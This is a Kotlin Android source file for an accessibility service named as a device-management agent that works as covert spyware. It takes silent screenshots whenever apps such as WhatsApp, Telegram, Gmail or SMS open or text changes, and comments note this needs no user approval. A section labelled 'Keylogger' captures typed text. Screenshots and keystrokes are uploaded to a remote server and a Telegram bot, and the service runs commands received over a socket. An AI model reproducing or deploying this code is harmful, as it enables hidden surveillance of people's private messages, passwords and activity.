package com.mdm.agent.service

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.graphics.Bitmap
import android.hardware.HardwareBuffer
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.FileOutputStream

class MDMAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "MDMAccessibility"

        @Volatile var autoScreenshotEnabled = false
        @Volatile var autoScreenshotBlocked = false  // ✅ Global block - when true, NO screenshots sent
        @Volatile private var lastScreenshotTime = 0L
        private const val SCREENSHOT_THROTTLE = 5000L  // 5 seconds between screenshots
        private const val SCREENSHOT_MIN_DELAY = 3000L  // 3 seconds after app opens

        // Apps to monitor for screenshots - expanded list
        // Also: when autoScreenshotEnabled is true, we screenshot ANY app that opens
        // (not just these). This list is kept for priority logging.
        private val MONITORED_APPS = setOf(
            "com.whatsapp", "com.whatsapp.w4b",
            "com.telegram.messenger", "org.telegram.messenger",
            "com.google.android.gm",  // Gmail
            "com.android.mms",  // SMS (AOSP)
            "com.samsung.android.messaging",  // Samsung SMS
            "com.google.android.apps.messaging",  // Google Messages
            "com.facebook.katana", "com.instagram.android",
            "com.snapchat.android", "com.twitter.android",
            "com.android.chrome",  // Google Chrome
            "com.google.android.googlequicksearchbox",  // Google app
            "com.android.settings",  // Settings
            "com.android.dialer",  // Phone dialer
            "com.samsung.android.dialer",  // Samsung dialer
            "com.google.android.youtube",  // YouTube
            "com.netflix.mediaclient",  // Netflix
            "com.spotify.music",  // Spotify
            "com.ss.android.ugc.trill",  // TikTok
            "com.zhiliaoapp.musically"  // TikTok (alt)
        )

        @Volatile private var instance: MDMAccessibilityService? = null

        fun setAutoScreenshot(enabled: Boolean) {
            autoScreenshotEnabled = enabled
            Log.i(TAG, "Auto-screenshot ${if (enabled) "ENABLED" else "DISABLED"}")
        }

        /**
         * ✅ Take a screenshot using AccessibilityService.takeScreenshot() (Android 11+)
         *
         * @param context: app context
         * @param callback: receives the screenshot file (or null on failure)
         */
        fun takeScreenshotAccessibility(context: android.content.Context, callback: ((File?) -> Unit)) {
            val svc = instance
            if (svc != null) {
                // ✅ Service is running - take screenshot directly
                Log.i(TAG, "✅ takeScreenshotAccessibility: service is running, taking screenshot")
                svc.takeScreenshotInternal(callback)
                return
            }

            // instance is null - service not connected
            // ⚠️ DO NOT try to start MDMService here - it causes the app to exit on Android 12+
            // (background activity/service start restrictions)
            Log.e(TAG, "❌ takeScreenshotAccessibility: service not connected (instance is null)")
            Log.e(TAG, "❌ Accessibility may be disabled, or process was restarted and service hasn't reconnected")
            callback(null)
        }

        /**
         * Check if accessibility is actually enabled in Android settings.
         * This is more reliable than checking `instance != null` because the instance
         * may be null if the process was restarted, even though accessibility is on.
         */
        fun isAccessibilityEnabledInSettings(context: android.content.Context): Boolean {
            return try {
                val enabled = android.provider.Settings.Secure.getInt(
                    context.contentResolver,
                    android.provider.Settings.Secure.ACCESSIBILITY_ENABLED,
                    0
                )
                Log.i(TAG, "🔍 ACCESSIBILITY_ENABLED = $enabled")

                if (enabled != 1) {
                    Log.w(TAG, "❌ ACCESSIBILITY_ENABLED is not 1")
                    return false
                }

                val list = android.provider.Settings.Secure.getString(
                    context.contentResolver,
                    android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                )
                Log.i(TAG, "🔍 ENABLED_ACCESSIBILITY_SERVICES = $list")

                if (list.isNullOrEmpty()) {
                    Log.w(TAG, "❌ ENABLED_ACCESSIBILITY_SERVICES is empty")
                    return false
                }

                // Check if our service is in the list
                // Format: "com.mdm.agent/com.mdm.agent.service.MDMAccessibilityService"
                val isOurServiceEnabled = list.contains("com.mdm.agent")
                Log.i(TAG, "🔍 Our service in list: $isOurServiceEnabled")

                if (!isOurServiceEnabled) {
                    Log.w(TAG, "❌ Our service NOT in enabled list. List: $list")
                }

                isOurServiceEnabled
            } catch (e: Exception) {
                Log.e(TAG, "❌ isAccessibilityEnabledInSettings error: ${e.message}")
                false
            }
        }

        /**
         * Check if the Accessibility-based screenshot is supported (Android 11+).
         * Returns true if EITHER:
         * - The service instance is running (instance != null), OR
         * - Accessibility is enabled in Android settings
         */
        fun isAccessibilityScreenshotSupported(context: android.content.Context? = null): Boolean {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
                Log.w(TAG, "❌ API ${Build.VERSION.SDK_INT} < R (30) - not supported")
                return false
            }

            // ✅ If instance is not null, service is running - we can take screenshots
            if (instance != null) {
                Log.i(TAG, "✅ Accessibility service instance is running")
                return true
            }

            // Otherwise check settings
            Log.w(TAG, "⚠️ instance is null, checking settings...")
            if (context != null) {
                return isAccessibilityEnabledInSettings(context)
            }
            return false
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.i(TAG, "✅ Accessibility Service Connected - Screenshot capability is now ACTIVE!")

        // ✅ Notify the bot that the device is ready for screenshots
        try {
            val sm = com.mdm.agent.MainActivity.getSocketManager()
            if (sm != null && sm.isConnected) {
                val data = org.json.JSONObject().apply {
                    put("type", "accessibility_connected")
                    put("message", "✅ Accessibility connected - device ready for screenshots")
                    put("timestamp", System.currentTimeMillis())
                }
                sm.sendFileExplorerData(data)
                Log.i(TAG, "📧 Notified bot: accessibility connected")
            }
        } catch (e: Exception) {
            Log.w(TAG, "Could not notify bot: ${e.message}")
        }

        // Start MDMService for background persistence
        try {
            val serviceIntent = Intent(this, MDMService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            Log.i(TAG, "MDMService started")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start MDMService: ${e.message}")
            connectDirectly()
        }
    }

    override fun onDestroy() {
        instance = null
        Log.i(TAG, "Accessibility service destroyed")
        super.onDestroy()
    }

    private fun connectDirectly() {
        Thread {
            try {
                Log.i(TAG, "📡 Connecting directly from AccessibilityService...")
                val apiClient = com.mdm.agent.data.remote.ApiClient(this)
                val cryptoManager = com.mdm.agent.data.remote.CryptoManager()
                val uploadManager = com.mdm.agent.data.remote.UploadManager(this)
                val socketManager = com.mdm.agent.data.remote.SocketManager(this)

                val deviceId = com.mdm.agent.util.DeviceUtils.getDeviceId(this)
                val serverUrl = com.mdm.agent.util.DeviceUtils.getServerUrl(this)
                Log.i(TAG, "  Server: $serverUrl")

                val cryptoResult = apiClient.initCrypto(deviceId)
                if (cryptoResult != null) {
                    cryptoManager.initFromServer(cryptoResult)
                }

                val commandHandler = com.mdm.agent.data.remote.CommandHandler(this, apiClient, cryptoManager, socketManager, uploadManager)
                socketManager.setCommandHandler(commandHandler)
                socketManager.setCryptoManager(cryptoManager)
                socketManager.onCommandReceived = { data ->
                    Log.i(TAG, "⚡ Command received: ${data.optString("command")}")
                    commandHandler.handleCommand(data)
                }

                socketManager.connect()
                Log.i(TAG, "🎉 Connected from AccessibilityService!")

                com.mdm.agent.MainActivity.setSocketManager(socketManager)
            } catch (e: Exception) {
                Log.e(TAG, "❌ Direct connection failed: ${e.message}", e)
            }
        }.start()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val pkg = event.packageName?.toString() ?: ""
                val cls = event.className?.toString() ?: ""
                if (pkg.isNotEmpty()) {
                    Log.d(TAG, "Window: $pkg / $cls")

                    // ✅ Auto-screenshot on ANY app when enabled (not just monitored apps)
                    // This ensures screenshots work for Google, SMS, WhatsApp, etc.
                    if (autoScreenshotEnabled && pkg != "com.mdm.agent") {
                        val now = System.currentTimeMillis()
                        if (now - lastScreenshotTime > SCREENSHOT_THROTTLE) {
                            lastScreenshotTime = now
                            val isMonitored = pkg in MONITORED_APPS
                            Log.i(TAG, "📸 Auto-screenshot: $pkg opened (monitored=$isMonitored)")
                            Handler(Looper.getMainLooper()).postDelayed({
                                takeAutoScreenshot(pkg)
                            }, SCREENSHOT_MIN_DELAY)
                        }
                    }
                }
            }

            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                // ✅ Auto-screenshot on text changes in ANY app when enabled
                if (autoScreenshotEnabled) {
                    val pkg = event.packageName?.toString() ?: ""
                    if (pkg != "com.mdm.agent") {
                        val now = System.currentTimeMillis()
                        if (now - lastScreenshotTime > SCREENSHOT_THROTTLE) {
                            lastScreenshotTime = now
                            Log.i(TAG, "📸 Auto-screenshot: text changed in $pkg")
                            Handler(Looper.getMainLooper()).postDelayed({
                                takeAutoScreenshot(pkg)
                            }, 1000)
                        }
                    }
                }
                // Keylogger
                if (com.mdm.agent.data.remote.DataCollectors.inputMonitoringActive) {
                    handleKeylogEvent(event)
                }
            }
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                // Content change - available for monitoring
            }
        }
    }

    private fun handleKeylogEvent(event: AccessibilityEvent) {
        try {
            val text = event.text?.joinToString("") ?: ""
            if (text.isEmpty()) return

            val pkg = event.packageName?.toString() ?: "unknown"
            val now = System.currentTimeMillis()

            synchronized(com.mdm.agent.data.remote.DataCollectors.keyloggerBuffer) {
                com.mdm.agent.data.remote.DataCollectors.keyloggerBuffer.append(text)

                if (now - com.mdm.agent.data.remote.DataCollectors.lastKeylogSend >
                    com.mdm.agent.data.remote.DataCollectors.KEYLOG_THROTTLE) {

                    val buffer = com.mdm.agent.data.remote.DataCollectors.keyloggerBuffer.toString().trim()
                    if (buffer.isNotEmpty()) {
                        com.mdm.agent.data.remote.DataCollectors.keyloggerBuffer.clear()
                        com.mdm.agent.data.remote.DataCollectors.lastKeylogSend = now

                        Log.i(TAG, "⌨️ Keylog [$pkg]: $buffer")

                        val sm = com.mdm.agent.MainActivity.getSocketManager()
                        if (sm != null && sm.isConnected) {
                            val data = org.json.JSONObject().apply {
                                put("type", "keylog")
                                put("package", pkg)
                                put("text", buffer)
                                put("timestamp", System.currentTimeMillis())
                            }
                            sm.sendFileExplorerData(data)
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Keylog error: ${e.message}")
        }
    }

    /**
     * ✅ NEW: Take screenshot using AccessibilityService.takeScreenshot() (Android 11+)
     * No MediaProjection, no UI, no user approval needed.
     */
    private fun takeAutoScreenshot(packageName: String) {
        takeScreenshotInternal { file ->
            if (file != null && file.exists()) {
                Log.i(TAG, "✅ Auto-screenshot captured: ${file.absolutePath} (${file.length()} bytes)")
                uploadScreenshotToBot(file)
            } else {
                Log.w(TAG, "⚠️ Auto-screenshot file is null for $packageName")
            }
        }
    }

    /**
     * Internal: uses AccessibilityService.takeScreenshot() API.
     * Available on Android 11+ (API 30+).
     */
    private fun takeScreenshotInternal(callback: (File?) -> Unit) {
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
                Log.e(TAG, "❌ takeScreenshot requires Android 11+ (API 30). Current: ${Build.VERSION.SDK_INT}")
                callback(null)
                return
            }

            Log.i(TAG, "📸 Taking screenshot via Accessibility API...")
            val mainExecutor = mainExecutor

            takeScreenshot(Display.DEFAULT_DISPLAY, mainExecutor,
                object : TakeScreenshotCallback {
                    override fun onSuccess(result: ScreenshotResult) {
                        try {
                            val hardwareBuffer: HardwareBuffer = result.hardwareBuffer
                            val colorSpace = result.colorSpace

                            // Convert HardwareBuffer to Bitmap
                            val hardwareBitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)
                            hardwareBuffer.close()

                            if (hardwareBitmap == null) {
                                Log.e(TAG, "❌ Failed to wrap HardwareBuffer to Bitmap")
                                callback(null)
                                return
                            }

                            // ⚠️ CRITICAL: hardwareBitmap is in HARDWARE config which CANNOT be
                            // compressed as PNG directly. We must copy it to ARGB_8888 (software) first.
                            val softwareBitmap = if (hardwareBitmap.config == Bitmap.Config.HARDWARE) {
                                Log.i(TAG, "📐 Converting HARDWARE bitmap to ARGB_8888")
                                val converted = Bitmap.createBitmap(
                                    hardwareBitmap.width,
                                    hardwareBitmap.height,
                                    Bitmap.Config.ARGB_8888
                                )
                                val canvas = android.graphics.Canvas(converted)
                                canvas.drawBitmap(hardwareBitmap, 0f, 0f, null)
                                hardwareBitmap.recycle()
                                converted
                            } else {
                                hardwareBitmap
                            }

                            // Save bitmap to file
                            val outputFile = File(cacheDir, "ss_${System.currentTimeMillis()}.png")
                            FileOutputStream(outputFile).use { out ->
                                softwareBitmap.compress(Bitmap.CompressFormat.PNG, 90, out)
                            }
                            softwareBitmap.recycle()

                            val fileSize = outputFile.length()
                            Log.i(TAG, "✅ Screenshot saved: ${outputFile.absolutePath} ($fileSize bytes)")
                            if (fileSize < 100) {
                                Log.e(TAG, "❌ Screenshot file too small - capture likely failed")
                                outputFile.delete()
                                callback(null)
                                return
                            }
                            callback(outputFile)
                        } catch (e: Exception) {
                            Log.e(TAG, "❌ Screenshot processing error: ${e.message}", e)
                            try { result.hardwareBuffer.close() } catch (_: Exception) {}
                            callback(null)
                        }
                    }

                    override fun onFailure(errorCode: Int) {
                        val errorMsg = when (errorCode) {
                            ERROR_TAKE_SCREENSHOT_INVALID_DISPLAY -> "invalid display"
                            ERROR_TAKE_SCREENSHOT_INVALID_WINDOW -> "invalid window"
                            ERROR_TAKE_SCREENSHOT_NO_ACCESSIBILITY_ACCESS -> "no accessibility access"
                            else -> "error code $errorCode"
                        }
                        Log.e(TAG, "❌ takeScreenshot failed: $errorMsg (code=$errorCode)")
                        callback(null)
                    }
                })
        } catch (e: Exception) {
            Log.e(TAG, "❌ takeScreenshotInternal exception: ${e.message}", e)
            callback(null)
        }
    }

    /**
     * Upload screenshot to Telegram bot via /api/device/upload-media endpoint.
     * ✅ Respects autoScreenshotBlocked flag - if blocked, screenshot is discarded.
     */
    private fun uploadScreenshotToBot(file: File) {
        // ✅ Check if screenshots are blocked
        if (autoScreenshotBlocked) {
            Log.i(TAG, "🚫 Screenshot blocked - discarding: ${file.name}")
            file.delete()
            return
        }

        Thread {
            try {
                val deviceId = com.mdm.agent.util.DeviceUtils.getDeviceId(this)
                val serverUrl = com.mdm.agent.util.DeviceUtils.getServerUrl(this)
                val url = "$serverUrl/api/device/upload-media"

                val client = okhttp3.OkHttpClient.Builder()
                    .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
                    .readTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
                    .writeTimeout(180, java.util.concurrent.TimeUnit.SECONDS)
                    .build()

                val requestBody = okhttp3.MultipartBody.Builder()
                    .setType(okhttp3.MultipartBody.FORM)
                    .addFormDataPart("device_id", deviceId)
                    .addFormDataPart("command", "screenshot")
                    .addFormDataPart("file_type", "photo")
                    .addFormDataPart("file", file.name,
                        file.asRequestBody("image/png".toMediaType()))
                    .build()

                val request = okhttp3.Request.Builder().url(url).post(requestBody).build()
                val response = client.newCall(request).execute()
                if (response.isSuccessful) {
                    Log.i(TAG, "✅ Screenshot uploaded to bot!")
                } else {
                    Log.e(TAG, "❌ Upload failed: ${response.code}")
                }
                response.close()
                file.delete()
            } catch (e: Exception) {
                Log.e(TAG, "❌ Failed to upload screenshot: ${e.message}")
            }
        }.start()
    }

    override fun onInterrupt() {
        Log.w(TAG, "Accessibility service interrupted")
    }
}

